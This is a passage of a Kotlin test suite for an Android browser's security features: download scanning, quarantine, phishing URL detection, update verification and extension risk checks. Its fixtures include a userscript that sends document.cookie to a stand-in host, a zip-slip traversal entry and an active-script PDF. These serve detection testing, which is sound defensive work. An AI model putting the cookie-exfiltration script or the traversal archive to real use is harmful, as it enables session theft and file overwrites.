package com.example

import android.content.Context
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.Color
import androidx.compose.ui.test.assertIsDisplayed
import androidx.compose.ui.test.hasText
import androidx.compose.ui.test.junit4.createComposeRule
import androidx.compose.ui.test.onNodeWithTag
import androidx.compose.ui.test.onNodeWithText
import androidx.compose.ui.test.performClick
import androidx.compose.ui.test.performScrollTo
import androidx.compose.ui.test.performScrollToNode
import androidx.room.Room
import androidx.test.core.app.ApplicationProvider
import com.example.data.WeblioRepository
import com.example.data.db.DownloadEntity
import com.example.data.db.DownloadFileCategory
import com.example.data.db.DownloadStatus
import com.example.data.db.ExtensionEntity
import com.example.data.db.FilterRuleType
import com.example.data.db.ThreatIndicatorEntity
import com.example.data.db.WeblioDatabase
import com.example.data.prefs.BrowserSettings
import com.example.data.security.KeystoreCryptoManager
import com.example.engine.AdBlockEngine
import com.example.engine.ApkInstallInfo
import com.example.engine.ExtensionEngine
import com.example.engine.PendingQuarantineReview
import com.example.engine.ProfileIsolationManager
import com.example.engine.WeblioDownloadManager
import com.example.security.AppIntegrityManager
import com.example.security.DownloadQuarantineManager
import com.example.security.DownloadScanReport
import com.example.security.DownloadSecurityScanner
import com.example.security.DownloadVerdict
import com.example.security.SecureUpdateVerifier
import com.example.security.SecurityState
import com.example.security.ThreatIntelligenceEngine
import com.example.security.WebsiteThreatReport
import com.example.security.WebsiteVerdict
import com.example.ui.screens.DangerousWebsiteWarningScreen
import com.example.ui.screens.DownloadSecurityDecisionDialog
import com.example.ui.screens.DownloadsScreen
import com.example.ui.screens.SecurityCenterScreen
import com.example.ui.theme.WeblioTheme
import kotlinx.coroutines.runBlocking
import org.junit.After
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Rule
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config
import java.io.File
import java.io.FileOutputStream
import java.security.MessageDigest
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

@RunWith(RobolectricTestRunner::class)
@Config(sdk = [36])
class WeblioSecurityTest {

    @get:Rule
    val composeRule = createComposeRule()

    private lateinit var context: Context
    private lateinit var db: WeblioDatabase
    private lateinit var repository: WeblioRepository
    private lateinit var quarantineManager: DownloadQuarantineManager
    private lateinit var scanner: DownloadSecurityScanner
    private lateinit var threatEngine: ThreatIntelligenceEngine
    private lateinit var extensionEngine: ExtensionEngine
    private lateinit var tempWorkDir: File

    @Before
    fun setup() {
        context = ApplicationProvider.getApplicationContext()
        db = Room.inMemoryDatabaseBuilder(context, WeblioDatabase::class.java)
            .allowMainThreadQueries()
            .build()
        repository = WeblioRepository(db)
        quarantineManager = DownloadQuarantineManager(context)
        scanner = DownloadSecurityScanner(repository)
        threatEngine = ThreatIntelligenceEngine(repository)
        extensionEngine = ExtensionEngine(context, repository)
        tempWorkDir = File(context.cacheDir, "sec_test_${System.currentTimeMillis()}").apply { mkdirs() }
    }

    @After
    fun teardown() {
        db.close()
        tempWorkDir.deleteRecursively()
        quarantineManager.quarantineDir.deleteRecursively()
        quarantineManager.downloadsDir.deleteRecursively()
    }

    @Test
    fun `1_safe text and pdf downloads return exact No known threats detected verdict`() = runBlocking {
        val pdfFile = File(tempWorkDir, "clean_guide.pdf").apply {
            writeBytes("%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF".toByteArray())
        }
        val report = scanner.scanQuarantinedFile(pdfFile, "clean_guide.pdf", "application/pdf", pdfFile.length())
        assertEquals(DownloadVerdict.SAFE, report.verdict)
        assertEquals("No known threats detected.", report.detectionReason)
        assertFalse(report.couldNotFullyVerify)
        assertEquals(64, report.sha256.length)
    }

    @Test
    fun `2_known malware hash stored in threat database triggers DANGEROUS verdict`() = runBlocking {
        val sampleFile = File(tempWorkDir, "payload.txt").apply {
            writeText("benign-looking test bytes representing known signature")
        }
        val expectedSha = SecureUpdateVerifier.computeFileSha256(sampleFile)
        repository.upsertThreatIndicators(
            listOf(
                ThreatIndicatorEntity(
                    indicator = expectedSha,
                    indicatorType = "HASH_SHA256",
                    category = "Trojan.TestSample",
                    severity = "DANGEROUS",
                    source = "UnitTest Threat DB"
                )
            )
        )
        val report = scanner.scanQuarantinedFile(sampleFile, "payload.txt", "text/plain", sampleFile.length())
        assertEquals(DownloadVerdict.DANGEROUS, report.verdict)
        assertEquals(expectedSha, report.sha256)
        assertTrue(report.detectionReason.contains("Trojan.TestSample"))
    }

    @Test
    fun `3_eicar test signature detects DANGEROUS without harming device`() = runBlocking {
        val eicarFile = File(tempWorkDir, "eicar.txt").apply {
            writeText(DownloadSecurityScanner.EICAR_TEST_SIGNATURE)
        }
        val report = scanner.scanQuarantinedFile(eicarFile, "eicar.txt", "text/plain", eicarFile.length())
        assertEquals(DownloadVerdict.DANGEROUS, report.verdict)
        assertTrue(report.threatCategory?.contains("EICAR") == true || report.threatCategory?.contains("Malware") == true)
    }

    @Test
    fun `4_suspicious executable and script extensions are flagged`() = runBlocking {
        val batFile = File(tempWorkDir, "update.bat").apply { writeText("@echo off\necho test\n") }
        val batReport = scanner.scanQuarantinedFile(batFile, "update.bat", "text/plain", batFile.length())
        assertEquals(DownloadVerdict.SUSPICIOUS, batReport.verdict)

        val peFile = File(tempWorkDir, "installer.exe").apply {
            writeBytes(byteArrayOf(0x4D, 0x5A, 0x90.toByte(), 0x00, 0x03, 0x00))
        }
        val peReport = scanner.scanQuarantinedFile(peFile, "installer.exe", "application/octet-stream", peFile.length())
        assertEquals(DownloadVerdict.DANGEROUS, peReport.verdict)
    }

    @Test
    fun `5_mime and magic byte mismatch detects disguised script or wrong image signature`() = runBlocking {
        val disguisedImg = File(tempWorkDir, "avatar.jpg").apply {
            writeText("#!/bin/sh\necho disguised script\n")
        }
        val report = scanner.scanQuarantinedFile(disguisedImg, "avatar.jpg", "image/jpeg", disguisedImg.length())
        assertEquals(DownloadVerdict.SUSPICIOUS, report.verdict)
        assertEquals("File Type / MIME Mismatch", report.threatCategory)

        val pngWithJpgMagic = File(tempWorkDir, "photo.png").apply {
            writeBytes(byteArrayOf(0xFF.toByte(), 0xD8.toByte(), 0xFF.toByte(), 0xE0.toByte(), 0x00))
        }
        val mismatch2 = scanner.scanQuarantinedFile(pngWithJpgMagic, "photo.png", "image/png", pngWithJpgMagic.length())
        assertEquals(DownloadVerdict.SUSPICIOUS, mismatch2.verdict)
    }

    @Test
    fun `6_double extension masquerading triggers DANGEROUS`() = runBlocking {
        val dbl = File(tempWorkDir, "invoice.pdf.exe").apply { writeText("test payload") }
        val report = scanner.scanQuarantinedFile(dbl, "invoice.pdf.exe", "application/pdf", dbl.length())
        assertEquals(DownloadVerdict.DANGEROUS, report.verdict)
        assertEquals("Double Extension Masquerading", report.threatCategory)
    }

    @Test
    fun `7_empty 0-byte or corrupted archive is never marked SAFE`() = runBlocking {
        val emptyFile = File(tempWorkDir, "broken.pdf").apply { writeBytes(ByteArray(0)) }
        val emptyReport = scanner.scanQuarantinedFile(emptyFile, "broken.pdf", "application/pdf", 128L)
        assertEquals(DownloadVerdict.SUSPICIOUS, emptyReport.verdict)
        assertTrue(emptyReport.couldNotFullyVerify)

        val corruptZip = File(tempWorkDir, "broken.zip").apply {
            writeBytes(byteArrayOf(0x50, 0x4B, 0x03, 0x04, 0x00, 0x01, 0x02))
        }
        val corruptReport = scanner.scanQuarantinedFile(corruptZip, "broken.zip", "application/zip", corruptZip.length())
        assertEquals(DownloadVerdict.SUSPICIOUS, corruptReport.verdict)
    }

    @Test
    fun `8_partial download byte mismatch is detected as SUSPICIOUS`() = runBlocking {
        val partialFile = File(tempWorkDir, "partial.txt").apply { writeText("partial-content") }
        val report = scanner.scanQuarantinedFile(partialFile, "partial.txt", "text/plain", expectedBytes = 4096L)
        assertEquals(DownloadVerdict.SUSPICIOUS, report.verdict)
        assertEquals("Partial / Interrupted Download", report.threatCategory)
    }

    @Test
    fun `9_large file streaming scan hashes and inspects cleanly without OOM`() = runBlocking {
        val largeFile = File(tempWorkDir, "large_doc.txt")
        val block = ("WEBLIO_STREAM_SCAN_TEST_LINE_0123456789ABCDEF\n").repeat(64).toByteArray()
        val digest = MessageDigest.getInstance("SHA-256")
        FileOutputStream(largeFile).use { fos ->
            repeat(900) { // ~2.65 MB
                fos.write(block)
                digest.update(block)
            }
        }
        val expectedHash = digest.digest().joinToString("") { "%02x".format(it) }
        val report = scanner.scanQuarantinedFile(largeFile, "large_doc.txt", "text/plain", largeFile.length())
        assertEquals(DownloadVerdict.SAFE, report.verdict)
        assertEquals(expectedHash, report.sha256)
    }

    @Test
    fun `10_zip inspection handles clean zip, zip slip traversal, and nested executables`() = runBlocking {
        val cleanZip = File(tempWorkDir, "clean.zip")
        ZipOutputStream(FileOutputStream(cleanZip)).use { zos ->
            zos.putNextEntry(ZipEntry("readme.txt"))
            zos.write("hello world".toByteArray())
            zos.closeEntry()
        }
        assertEquals(
            DownloadVerdict.SAFE,
            scanner.scanQuarantinedFile(cleanZip, "clean.zip", "application/zip", cleanZip.length()).verdict
        )

        val zipSlip = File(tempWorkDir, "traversal.zip")
        ZipOutputStream(FileOutputStream(zipSlip)).use { zos ->
            zos.putNextEntry(ZipEntry("../../etc/evil.txt"))
            zos.write("escape".toByteArray())
            zos.closeEntry()
        }
        val slipReport = scanner.scanQuarantinedFile(zipSlip, "traversal.zip", "application/zip", zipSlip.length())
        assertEquals(DownloadVerdict.DANGEROUS, slipReport.verdict)
        assertEquals("Zip-Slip Path Traversal", slipReport.threatCategory)

        val nestedExeZip = File(tempWorkDir, "nested.zip")
        ZipOutputStream(FileOutputStream(nestedExeZip)).use { zos ->
            zos.putNextEntry(ZipEntry("bin/run.bat"))
            zos.write("@echo off".toByteArray())
            zos.closeEntry()
        }
        val nestedReport = scanner.scanQuarantinedFile(nestedExeZip, "nested.zip", "application/zip", nestedExeZip.length())
        assertEquals(DownloadVerdict.SUSPICIOUS, nestedReport.verdict)
        assertEquals("Executable Content Inside Archive", nestedReport.threatCategory)
    }

    @Test
    fun `11_apk inspection validates manifest and classes dex structure`() = runBlocking {
        val validApk = File(tempWorkDir, "sample.apk")
        ZipOutputStream(FileOutputStream(validApk)).use { zos ->
            zos.putNextEntry(ZipEntry("AndroidManifest.xml"))
            zos.write(byteArrayOf(0x03, 0x00, 0x08, 0x00))
            zos.closeEntry()
            zos.putNextEntry(ZipEntry("classes.dex"))
            zos.write(byteArrayOf(0x64, 0x65, 0x78, 0x0A))
            zos.closeEntry()
        }
        val apkReport = scanner.scanQuarantinedFile(
            validApk, "sample.apk", "application/vnd.android.package-archive", validApk.length()
        )
        assertEquals(DownloadVerdict.SUSPICIOUS, apkReport.verdict)
        assertEquals("Unverified Android Installer (APK)", apkReport.threatCategory)

        val malformedApk = File(tempWorkDir, "tampered.apk")
        ZipOutputStream(FileOutputStream(malformedApk)).use { zos ->
            zos.putNextEntry(ZipEntry("assets/dummy.txt"))
            zos.write("missing manifest".toByteArray())
            zos.closeEntry()
        }
        val malformedReport = scanner.scanQuarantinedFile(
            malformedApk, "tampered.apk", "application/vnd.android.package-archive", malformedApk.length()
        )
        assertEquals(DownloadVerdict.DANGEROUS, malformedReport.verdict)
    }

    @Test
    fun `12_pdf active script triggers SUSPICIOUS verdict`() = runBlocking {
        val scriptedPdf = File(tempWorkDir, "active.pdf").apply {
            writeBytes("%PDF-1.7\n1 0 obj\n<< /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>\nendobj".toByteArray())
        }
        val report = scanner.scanQuarantinedFile(scriptedPdf, "active.pdf", "application/pdf", scriptedPdf.length())
        assertEquals(DownloadVerdict.SUSPICIOUS, report.verdict)
        assertEquals("Active PDF Script / Launch Action", report.threatCategory)
    }

    @Test
    fun `13_quarantine lifecycle handles cancellation, abandoned cleanup, duplicate lock, and override`() = runBlocking {
        val qFile = quarantineManager.allocateQuarantineFile(99L, "suspicious.bat")
        qFile.writeText("@echo risky")
        val entity = DownloadEntity(
            id = 0,
            profileId = 1L,
            url = "https://example.com/suspicious.bat",
            fileName = "suspicious.bat",
            mimeType = "text/plain",
            category = DownloadFileCategory.SCRIPT.name,
            localPath = qFile.absolutePath,
            totalBytes = qFile.length(),
            downloadedBytes = qFile.length(),
            status = DownloadStatus.QUARANTINED.name,
            securityVerdict = DownloadVerdict.SUSPICIOUS.name,
            threatCategory = "Suspicious Script",
            threatReason = "Executable script extension",
            quarantined = true
        )
        val insertedId = repository.insertDownload(entity)

        val dm = WeblioDownloadManager(context, repository, quarantineManager, scanner)
        // Cancel quarantined download -> secure deletion, CANCELLED verdict, removed from quarantine & downloads
        val cancelled = dm.resolveQuarantinedDownload(insertedId, allowContinue = false).getOrThrow()
        assertEquals("CANCELLED", cancelled.securityVerdict)
        assertFalse(cancelled.quarantined)
        assertFalse(qFile.exists())

        // User-overridden flow keeps original verdict flagged and removes temp quarantine file
        val qFile2 = quarantineManager.allocateQuarantineFile(100L, "manual.bat").apply { writeText("@echo test") }
        val id2 = repository.insertDownload(entity.copy(id = 0, fileName = "manual.bat", localPath = qFile2.absolutePath))
        val promoted = dm.resolveQuarantinedDownload(id2, allowContinue = true).getOrThrow()
        assertTrue(promoted.userOverridden)
        assertFalse(promoted.quarantined)
        assertEquals(DownloadVerdict.SUSPICIOUS.name, promoted.securityVerdict)
        assertFalse(qFile2.exists())
        assertTrue(File(promoted.localPath).exists())

        // Duplicate download key prevention
        assertTrue(quarantineManager.tryAcquireProcessKey("dl_1_same"))
        assertFalse(quarantineManager.tryAcquireProcessKey("dl_1_same"))
        quarantineManager.releaseProcessKey("dl_1_same")

        // Abandoned cleanup removes stale temp files while keeping active paths
        val stale = File(quarantineManager.quarantineDir, "stale.part").apply {
            writeText("stale")
            setLastModified(System.currentTimeMillis() - 48 * 3600_000L)
        }
        val active = File(quarantineManager.quarantineDir, "active.part").apply {
            writeText("active")
            setLastModified(System.currentTimeMillis() - 48 * 3600_000L)
        }
        val cleaned = quarantineManager.cleanupAbandonedFiles(
            maxAgeMillis = 24 * 3600_000L,
            activePaths = setOf(active.absolutePath)
        )
        assertEquals(1, cleaned)
        assertFalse(stale.exists())
        assertTrue(active.exists())
    }

    @Test
    fun `14_15_phishing spoofing homograph and malicious redirect detection`() = runBlocking {
        val testPhish = threatEngine.evaluateNavigation("https://testsafebrowsing.appspot.com/s/phishing.html")
        assertEquals(WebsiteVerdict.DANGEROUS, testPhish.verdict)

        val userInfoSpoof = threatEngine.evaluateNavigation("https://google.com@evil-login.example/signin")
        assertEquals(WebsiteVerdict.DANGEROUS, userInfoSpoof.verdict)

        val homograph = threatEngine.evaluateNavigation("https://xn--pypal-4ve.com/login")
        assertEquals(WebsiteVerdict.DANGEROUS, homograph.verdict)

        val brandImpersonation = threatEngine.evaluateNavigation("https://paypal-security-alert.xyz/verify")
        assertEquals(WebsiteVerdict.DANGEROUS, brandImpersonation.verdict)

        val safeSite = threatEngine.evaluateNavigation("https://en.wikipedia.org/wiki/Transport_Layer_Security")
        assertEquals(WebsiteVerdict.SAFE, safeSite.verdict)

        val redirectReport = threatEngine.evaluateRedirect(
            originalUrl = "https://news.example.com/article",
            redirectDestination = "https://phishing.testing.weblio.local/capture"
        )
        assertEquals(WebsiteVerdict.DANGEROUS, redirectReport.verdict)
        assertTrue(redirectReport.threatCategory.contains("Redirect"))

        // Hostfile parser
        val hostFeed = ThreatIntelligenceEngine.parseHostfileThreatFeed(
            rawBody = "# comment\n127.0.0.1 evil-malware.example\n0.0.0.0 tracker-phish.example\n127.0.0.1 localhost\n"
        )
        assertEquals(2, hostFeed.size)
        assertEquals("evil-malware.example", hostFeed[0].indicator)
    }

    @Test
    fun `16_17_update verifier blocks http downgrade hash mismatch and accepts valid package checks`() {
        val verifier = SecureUpdateVerifier(context)
        val apk = File(tempWorkDir, "update.apk").apply { writeText("simulated-apk-bytes") }
        val actualSha = SecureUpdateVerifier.computeFileSha256(apk)

        // Reject HTTP URL
        val httpJson = """{"versionCode":99,"versionName":"2.0","downloadUrl":"http://evil.example/app.apk","sha256":"$actualSha"}"""
        assertTrue(verifier.validateMetadata(httpJson, currentVersionCode = 1L).isFailure)

        // Reject downgrade
        val downgradeJson = """{"versionCode":1,"versionName":"1.0","downloadUrl":"https://updates.example/app.apk","sha256":"$actualSha"}"""
        assertTrue(verifier.validateMetadata(downgradeJson, currentVersionCode = 5L).isFailure)

        // Reject SHA-256 mismatch
        val validMeta = verifier.validateMetadata(
            """{"versionCode":10,"versionName":"2.0","downloadUrl":"https://updates.example/app.apk","sha256":"${"0".repeat(64)}","signerSha256":"abc"}""",
            currentVersionCode = 1L
        ).getOrThrow()
        val hashFail = verifier.verifyUpdateApkFile(apk, validMeta, installedSignerSha256 = "abc", currentVersionCode = 1L)
        assertFalse(hashFail.isValid)
        assertFalse(hashFail.sha256Verified)

        // Reject modified / missing APK signature
        val matchingHashMeta = validMeta.copy(expectedSha256 = actualSha)
        val sigFail = verifier.verifyUpdateApkFile(apk, matchingHashMeta, installedSignerSha256 = "expected_release_signer", currentVersionCode = 1L)
        assertFalse(sigFail.isValid)
        assertTrue(sigFail.sha256Verified)
        assertFalse(sigFail.signatureVerified)
    }

    @Test
    fun `18_app integrity manager evaluates runtime build and signer without crashing`() {
        val integrity = AppIntegrityManager(context)
        val report = integrity.verifyAppIntegrity()
        assertEquals(context.packageName, report.packageName)
        assertTrue(report.playIntegrityNote.contains("Play Integrity"))
        // Under mismatched expected release signer, must report THREAT_DETECTED
        val spoofedCheck = integrity.verifyAppIntegrity(expectedReleaseSignersSha256 = setOf("deadbeef".repeat(8)))
        if (report.signingSha256.isNotBlank()) {
            assertEquals(SecurityState.THREAT_DETECTED, spoofedCheck.state)
        } else {
            assertEquals(SecurityState.VERIFICATION_UNAVAILABLE, spoofedCheck.state)
        }
    }

    @Test
    fun `19_extension security detects high risk permissions, isolates storage, and blocks tampering`() = runBlocking {
        val riskyScript = """
            // ==UserScript==
            // @name StealerTest
            // @match <all_urls>
            // @grant cookies
            // @grant passwords
            // ==/UserScript==
            eval("console.log('dynamic')");
            fetch("https://collector.example/?c=" + encodeURIComponent(document.cookie));
        """.trimIndent()

        val outcome = extensionEngine.installUserScript(1L, riskyScript, "StealerTest")
        assertTrue(outcome is ExtensionEngine.InstallOutcome.Success)
        val ext = (outcome as ExtensionEngine.InstallOutcome.Success).extension
        assertEquals("HIGH", ext.riskLevel)
        // High-risk scripts MUST NOT auto-enable silently on install
        assertFalse(ext.enabled)
        assertEquals(64, ext.contentHashSha256.length)
        assertTrue(ExtensionEngine.verifyExtensionIntegrity(ext))

        // Verify per-extension isolated storage (must NOT contain shared storage bucket)
        val enabledForUnitCheck = ext.copy(enabled = true)
        var tamperDetected = false
        val payload = extensionEngine.buildInjectionPayload(
            extensions = listOf(enabledForUnitCheck),
            url = "https://example.com",
            stage = "document_end",
            onIntegrityViolation = { tamperDetected = true }
        )
        assertFalse(tamperDetected)
        assertTrue(payload.contains("__weblioCreateExtChrome"))
        assertFalse(payload.contains("getStorage('shared')"))

        // Tamper with script content without updating SHA-256 -> execution must be blocked
        val tampered = enabledForUnitCheck.copy(scriptContent = "alert('injected_backdoor')")
        assertFalse(ExtensionEngine.verifyExtensionIntegrity(tampered))
        val blockedPayload = extensionEngine.buildInjectionPayload(
            extensions = listOf(tampered),
            url = "https://example.com",
            stage = "document_end",
            onIntegrityViolation = { tamperDetected = true }
        )
        assertTrue(tamperDetected)
        assertFalse(blockedPayload.contains("injected_backdoor"))
    }

    @Test
    fun `20_profile isolation and keystore crypto protect pins and passwords`() {
        val (hash, salt) = KeystoreCryptoManager.hashPin("7391")
        assertTrue(KeystoreCryptoManager.verifyPin("7391", hash, salt))
        assertFalse(KeystoreCryptoManager.verifyPin("1111", hash, salt))

        val personalId = ProfileIsolationManager.resolveTargetWebProfileName("weblio_personal", isIncognito = false, isGuest = false)
        val workId = ProfileIsolationManager.resolveTargetWebProfileName("weblio_work", isIncognito = false, isGuest = false)
        val incogId = ProfileIsolationManager.resolveTargetWebProfileName("weblio_personal", isIncognito = true, isGuest = false)
        val guestId = ProfileIsolationManager.resolveTargetWebProfileName("weblio_personal", isIncognito = false, isGuest = true)
        assertTrue(personalId != workId)
        assertEquals("weblio_incognito_ephemeral", incogId)
        assertEquals("weblio_guest_ephemeral", guestId)
    }

    @Test
    fun `21_security UI screens render exact warnings, download decisions, and Security Center states`() {
        var backCalled = false
        var overrideCalled = false
        composeRule.setContent {
            WeblioTheme {
                DangerousWebsiteWarningScreen(
                    report = WebsiteThreatReport(
                        url = "https://phishing.testing.weblio.local",
                        host = "phishing.testing.weblio.local",
                        verdict = WebsiteVerdict.DANGEROUS,
                        threatCategory = "Phishing Simulation",
                        reason = "Matched local threat database.",
                        source = "WEBLIO Shield"
                    ),
                    onGoBack = { backCalled = true },
                    onContinueAnyway = { overrideCalled = true }
                )
            }
        }
        composeRule.waitForIdle()
        composeRule.onNodeWithText("DANGEROUS WEBSITE!").assertIsDisplayed()
        composeRule.onNodeWithText(
            "WEBLIO Security Protection has detected a potential threat. This website may attempt to steal your information, install malicious software, or compromise your privacy."
        ).assertIsDisplayed()
        composeRule.onNodeWithTag("website_warning_goback").performScrollTo().performClick()
        assertTrue(backCalled)
        composeRule.onNodeWithTag("website_warning_continue").performScrollTo().performClick()
        composeRule.waitForIdle()
        composeRule.onNodeWithTag("website_warning_confirm_override").performClick()
        assertTrue(overrideCalled)
    }

    @Test
    fun `21b_download security decision dialog and security center state display accurately`() {
        var cancelledId: Long? = null
        val review = PendingQuarantineReview(
            download = DownloadEntity(
                id = 42L,
                profileId = 1L,
                url = "https://example.com/malware.exe",
                fileName = "malware.exe",
                mimeType = "application/octet-stream",
                localPath = "/data/local/tmp/q_42",
                status = DownloadStatus.QUARANTINED.name,
                securityVerdict = DownloadVerdict.DANGEROUS.name,
                quarantined = true
            ),
            report = DownloadScanReport(
                verdict = DownloadVerdict.DANGEROUS,
                fileName = "malware.exe",
                declaredMime = "application/octet-stream",
                detectedTypeLabel = "Windows PE/MZ Executable",
                sha256 = "abcd".repeat(16),
                actualBytes = 2048L,
                expectedBytes = 2048L,
                threatCategory = "Native Executable Binary",
                detectionReason = "Compiled executable binary detected.",
                recommendation = "Cancel download immediately."
            )
        )

        composeRule.setContent {
            WeblioTheme {
                DownloadSecurityDecisionDialog(
                    review = review,
                    onContinueAnyway = {},
                    onCancelDownload = { cancelledId = it },
                    onDismiss = {}
                )
            }
        }
        composeRule.waitForIdle()
        composeRule.onNodeWithText("Dangerous Download Blocked").assertIsDisplayed()
        composeRule.onNodeWithTag("download_decision_cancel").performClick()
        assertEquals(42L, cancelledId)
    }

    @Test
    fun `21c_security center shows honest Protection state without fake numeric scores`() {
        composeRule.setContent {
            WeblioTheme {
                SecurityCenterScreen(
                    overallState = SecurityState.PROTECTED,
                    settings = BrowserSettings(),
                    integrityReport = null,
                    threatDbCount = 120,
                    isUpdatingThreatDb = false,
                    quarantinedDownloads = emptyList(),
                    extensions = emptyList<ExtensionEntity>(),
                    securityEvents = emptyList(),
                    onReviewQuarantined = {},
                    onRunIntegrityCheck = {},
                    onUpdateThreatDb = {},
                    onVerifyUpdatePackage = { _, _ -> Result.failure(IllegalStateException()) },
                    onToggleCloudHashLookup = {},
                    onOpenExtensions = {},
                    onOpenDownloads = {},
                    onClearHistory = {},
                    onBack = {}
                )
            }
        }
        composeRule.waitForIdle()
        composeRule.onNodeWithText("Protected").assertIsDisplayed()
        composeRule.onNodeWithText("Safe Browsing & Threat Intelligence").assertIsDisplayed()
        composeRule.onNodeWithText("Active (120 cached indicators)").assertIsDisplayed()
        composeRule.onNodeWithTag("security_center_screen")
            .performScrollToNode(hasText("Download Quarantine & Streaming Scanner"))
        composeRule.onNodeWithText("Download Quarantine & Streaming Scanner").assertIsDisplayed()
    }

    @Test
    fun `22_apk install inspection validates package, builds safe html preview urls, and enforces apk mime`() {
        val dm = WeblioDownloadManager(context, repository, quarantineManager, scanner)

        val validApkFile = File(quarantineManager.downloadsDir, "app_release.apk").apply {
            parentFile?.mkdirs()
        }
        ZipOutputStream(FileOutputStream(validApkFile)).use { zos ->
            zos.putNextEntry(ZipEntry("AndroidManifest.xml"))
            zos.write(byteArrayOf(0x03, 0x00, 0x08, 0x00))
            zos.closeEntry()
            zos.putNextEntry(ZipEntry("classes.dex"))
            zos.write(byteArrayOf(0x64, 0x65, 0x78, 0x0A))
            zos.closeEntry()
        }
        val completedApk = DownloadEntity(
            id = 101L,
            profileId = 1L,
            url = "https://example.com/app_release.apk",
            fileName = "app_release.apk",
            mimeType = "application/octet-stream",
            category = DownloadFileCategory.APK.name,
            localPath = validApkFile.absolutePath,
            totalBytes = validApkFile.length(),
            downloadedBytes = validApkFile.length(),
            status = DownloadStatus.COMPLETED.name,
            securityVerdict = DownloadVerdict.SUSPICIOUS.name,
            userOverridden = true,
            quarantined = false
        )

        val inspectRes = dm.inspectApkForInstall(completedApk)
        assertTrue(inspectRes.isSuccess)
        val info = inspectRes.getOrThrow()
        assertEquals("app_release.apk", info.fileName)
        assertEquals(validApkFile.length(), info.fileSizeBytes)
        assertTrue(info.securityNotice.contains("quarantine", ignoreCase = true))

        val openIntent = dm.openDownloadedFile(completedApk).getOrThrow()
        assertEquals("application/vnd.android.package-archive", openIntent.type)

        // Quarantined APK must be blocked from install dialog
        assertTrue(dm.inspectApkForInstall(completedApk.copy(quarantined = true)).isFailure)

        // Invalid APK missing AndroidManifest/classes.dex must fail inspection
        val badApkFile = File(quarantineManager.downloadsDir, "bad.apk").apply { writeText("not an apk") }
        assertTrue(
            dm.inspectApkForInstall(
                completedApk.copy(id = 102L, fileName = "bad.apk", localPath = badApkFile.absolutePath)
            ).isFailure
        )

        // Local HTML preview URL uses safe virtual HTTPS domain, never raw file://
        val htmlInsideDownloads = File(quarantineManager.downloadsDir, "my report.html").apply {
            writeText("<html><title>Test</title><body><h1>Hello</h1></body></html>")
        }
        val htmlEntity = DownloadEntity(
            id = 201L,
            profileId = 1L,
            url = "https://example.com/my%20report.html",
            fileName = "my report.html",
            mimeType = "text/html",
            category = DownloadFileCategory.DOCUMENT.name,
            localPath = htmlInsideDownloads.absolutePath,
            status = DownloadStatus.COMPLETED.name,
            securityVerdict = DownloadVerdict.SAFE.name,
            quarantined = false
        )
        val previewUrl = dm.buildLocalHtmlPreviewUrl(htmlEntity)
        assertTrue(previewUrl.startsWith("https://${WeblioDownloadManager.LOCAL_PREVIEW_HOST}/"))
        assertFalse(previewUrl.startsWith("file://"))

        val externalHtml = File(tempWorkDir, "ext.html").apply { writeText("<html></html>") }
        val fallbackUrl = dm.buildLocalHtmlPreviewUrl(htmlEntity.copy(localPath = externalHtml.absolutePath))
        assertEquals("https://${WeblioDownloadManager.LOCAL_PREVIEW_HOST}/__id/201/my%20report.html", fallbackUrl)
        // Verify extractApkIconBitmap safely returns null for missing, empty, or headerless APKs
        org.junit.Assert.assertNull(WeblioDownloadManager.extractApkIconBitmap(context, ""))
        org.junit.Assert.assertNull(WeblioDownloadManager.extractApkIconBitmap(context, badApkFile.absolutePath))
        org.junit.Assert.assertNull(WeblioDownloadManager.extractApkIconBitmap(context, validApkFile.absolutePath))
    }

    @Test
    fun `23_downloads screen prompts install cancel for valid apk and opens html in new tab`() {
        val apkFile = File(quarantineManager.downloadsDir, "sample_app.apk").apply {
            parentFile?.mkdirs()
        }
        ZipOutputStream(FileOutputStream(apkFile)).use { zos ->
            zos.putNextEntry(ZipEntry("AndroidManifest.xml"))
            zos.write(byteArrayOf(0x03, 0x00, 0x08, 0x00))
            zos.closeEntry()
            zos.putNextEntry(ZipEntry("classes.dex"))
            zos.write(byteArrayOf(0x64, 0x65, 0x78, 0x0A))
            zos.closeEntry()
        }
        val htmlFile = File(quarantineManager.downloadsDir, "index.html").apply {
            writeText("<html><body>Preview</body></html>")
        }

        val apkEntity = DownloadEntity(
            id = 11L,
            profileId = 1L,
            url = "https://example.com/sample_app.apk",
            fileName = "sample_app.apk",
            mimeType = "application/vnd.android.package-archive",
            category = DownloadFileCategory.APK.name,
            localPath = apkFile.absolutePath,
            totalBytes = apkFile.length(),
            downloadedBytes = apkFile.length(),
            status = DownloadStatus.COMPLETED.name,
            securityVerdict = DownloadVerdict.SAFE.name,
            quarantined = false
        )
        val htmlEntity = DownloadEntity(
            id = 12L,
            profileId = 1L,
            url = "https://example.com/index.html",
            fileName = "index.html",
            mimeType = "text/html",
            category = DownloadFileCategory.DOCUMENT.name,
            localPath = htmlFile.absolutePath,
            totalBytes = htmlFile.length(),
            downloadedBytes = htmlFile.length(),
            status = DownloadStatus.COMPLETED.name,
            securityVerdict = DownloadVerdict.SAFE.name,
            quarantined = false
        )

        val ownerBitmap = Bitmap.createBitmap(48, 48, Bitmap.Config.ARGB_8888).apply {
            Canvas(this).drawColor(Color.CYAN)
        }
        var openedApkIntentCount = 0
        var openedHtmlEntity: DownloadEntity? = null

        composeRule.setContent {
            WeblioTheme {
                DownloadsScreen(
                    downloads = listOf(apkEntity, htmlEntity),
                    downloadLocationLabel = "WEBLIO/Downloads",
                    onEnqueueUrl = { _, _ -> },
                    onPause = {},
                    onResumeOrRetry = {},
                    onCancel = {},
                    onDelete = {},
                    onOpenFile = { entity ->
                        if (entity.id == apkEntity.id) {
                            openedApkIntentCount++
                        }
                        Result.failure(IllegalStateException("Test handled"))
                    },
                    onClearAll = {},
                    onShowMessage = {},
                    onBack = {},
                    onInspectApk = { entity ->
                        Result.success(
                            ApkInstallInfo(
                                fileName = entity.fileName,
                                fileSizeBytes = apkFile.length(),
                                appLabel = "Sample App",
                                packageName = "com.example.sample",
